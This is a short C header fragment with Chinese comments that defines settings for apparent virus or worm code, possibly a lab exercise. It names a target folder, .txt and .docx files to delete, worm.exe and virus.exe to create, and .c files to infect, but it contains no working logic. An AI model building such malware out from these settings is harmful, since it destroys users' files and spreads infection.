...
//本地文件的各种定义
#define INFECT_PATH "D:\\zhaozhuang"  //需要进行的操作目录
#define DELETE_FILE1 "D:\\zhaozhuang\\*.txt" //要被删除的文件后缀
#define DELETE_FILE2 "D:\\zhaozhuang\\*.docx"
#define CREAT_EXE1 "D:\\zhaozhuang\\worm.exe"
#define CREAT_EXE2 "D:\\zhaozhuang\\virus.exe"
#define Targetfile "D:\\zhaozhuang\\*.c"  //要感染的文件后缀
